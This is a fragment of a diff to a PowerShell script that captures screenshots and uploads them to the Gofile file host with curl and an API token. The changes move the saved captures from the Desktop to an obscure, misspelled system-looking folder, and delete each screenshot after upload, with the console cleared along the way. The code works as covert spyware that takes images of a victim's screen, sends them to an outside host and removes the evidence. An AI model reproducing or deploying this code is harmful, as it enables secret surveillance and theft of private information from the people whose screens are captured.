@@ -1,7 +1,7 @@
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
-$filePath = "$env:USERPROFILE\Desktop\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
+$filePath = "C:\ProgramX64\extentions\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
 
 $screen = [System.Windows.Forms.Screen]::PrimaryScreen
 $top    = $screen.Bounds.Top
@@ -36,7 +36,7 @@ function Upload-FilesToGofile {
                 
                 curl.exe -sS -F "file=@$file" -F "token=$ApiKey" -F "folderId=$newFolderId" $uploadUri
                 cls
-                Remove-Item $zipPath -Force
+                Remove-Item $FilePath -Force
                 
                 Start-Sleep -Milliseconds 200
                 
